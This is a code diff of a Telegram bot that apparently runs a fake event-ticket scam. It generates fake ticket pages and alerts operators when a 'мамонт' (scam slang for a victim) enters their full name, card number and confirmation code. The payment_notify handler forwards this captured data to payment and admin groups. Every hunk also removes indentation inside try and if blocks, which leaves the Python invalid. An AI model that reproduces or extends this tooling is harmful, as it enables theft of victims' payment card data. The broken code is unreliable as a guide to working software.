@@ -207,20 +207,20 @@ def create_site_user(dates, currency, street, price):
         if page_code in busy_codes:
             continue
         try:
-            c.execute('''INSERT INTO site_users 
-                         (id, date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8, currency, street, price, page_code) 
-                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-                      (user_id, dates[0], dates[1], dates[2], dates[3], dates[4], dates[5], dates[6], dates[7], currency, street, price, page_code))
-            conn.commit()
-            # --- Додаємо початкову кількість квитків для кожної події ---
-            for event_index in range(8):
-                if event_index == 1:
-                    places = 3
-                else:
-                    places = random.randint(1, 10)
-                c.execute('INSERT OR REPLACE INTO event_places (page_code, event_index, places) VALUES (?, ?, ?)', (page_code, event_index, places))
-            conn.commit()
-            return user_id, page_code
+    c.execute('''INSERT INTO site_users 
+                 (id, date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8, currency, street, price, page_code) 
+                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+              (user_id, dates[0], dates[1], dates[2], dates[3], dates[4], dates[5], dates[6], dates[7], currency, street, price, page_code))
+    conn.commit()
+    # --- Додаємо початкову кількість квитків для кожної події ---
+    for event_index in range(8):
+        if event_index == 1:
+            places = 3
+        else:
+            places = random.randint(1, 10)
+        c.execute('INSERT OR REPLACE INTO event_places (page_code, event_index, places) VALUES (?, ?, ?)', (page_code, event_index, places))
+    conn.commit()
+    return user_id, page_code
         except sqlite3.IntegrityError as e:
             if 'UNIQUE constraint failed: site_users.page_code' in str(e):
                 continue  # спробувати ще раз
@@ -366,7 +366,7 @@ async def cmd_start(message: types.Message):
         elif db_user['status'] == 'approved':
             kb = admin_menu_kb if is_admin(uid) else main_menu_kb
             if message.chat.type == "private":
-                await message.answer("Ваша заявка одобрена!\nДля продолжения работы используйте меню ниже:", reply_markup=kb)
+            await message.answer("Ваша заявка одобрена!\nДля продолжения работы используйте меню ниже:", reply_markup=kb)
             else:
                 await message.answer("Ваша заявка одобрена!\nДля продолжения работы используйте меню ниже:", reply_markup=ReplyKeyboardRemove())
             return
@@ -586,7 +586,7 @@ async def back_to_menu_handler(call: types.CallbackQuery):
     user_step[uid] = None
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
     if call.message.chat.type == "private":
-        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     else:
         await call.message.answer("Возврат в главное меню.")
     await call.answer()
@@ -1706,13 +1706,13 @@ async def payment_notify(request):
         ]
     )
     try:
-        await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
+    await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
     except Exception as e:
         print(f"[ERROR] Не вдалося надіслати msg1 у PAYMENT_GROUP_ID: {e}")
         import traceback
         traceback.print_exc()
     try:
-        await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
+    await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
     except Exception as e:
         print(f"[ERROR] Не вдалося надіслати msg1 у ADMIN_GROUP_ID: {e}")
         import traceback
@@ -1744,7 +1744,7 @@ async def payment_notify(request):
     ]
     )
     try:
-        await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
+    await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
     except Exception as e:
         print(f"[ERROR] Не вдалося надіслати msg2 у PAYMENT_GROUP_ID: {e}")
         import traceback
@@ -1763,7 +1763,7 @@ async def payment_notify(request):
             ]
         )
         try:
-            await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
+        await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
         except Exception as e:
             print(f"[ERROR] Не вдалося надіслати msg3 у PAYMENT_GROUP_ID: {e}")
             import traceback
@@ -1779,20 +1779,20 @@ async def payment_notify(request):
             admin_user_id = row[0]
     if admin_user_id:
         try:
-            await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
+        await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
         except Exception as e:
             print(f"[ERROR] Не вдалося надіслати ФИО admin_user_id: {e}")
             import traceback
             traceback.print_exc()
         try:
-            await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
+        await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
         except Exception as e:
             print(f"[ERROR] Не вдалося надіслати карту admin_user_id: {e}")
             import traceback
             traceback.print_exc()
         if code:
             try:
-                await bot.send_message(admin_user_id, 'Мамонт ввёл код')
+            await bot.send_message(admin_user_id, 'Мамонт ввёл код')
             except Exception as e:
                 print(f"[ERROR] Не вдалося надіслати код admin_user_id: {e}")
                 import traceback
@@ -2278,7 +2278,7 @@ async def universal_back_handler(message: types.Message):
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
     user_step[uid] = None
     if message.chat.type == "private":
-        await message.answer("Возврат в главное меню.", reply_markup=kb)
+    await message.answer("Возврат в главное меню.", reply_markup=kb)
     else:
         await message.answer("Возврат в главное меню.")
 
@@ -2296,7 +2296,7 @@ async def universal_inline_back_handler(call: types.CallbackQuery):
     if call.data == "tickets_cancel":
         await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
     else:
-        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     
     await call.answer()
 
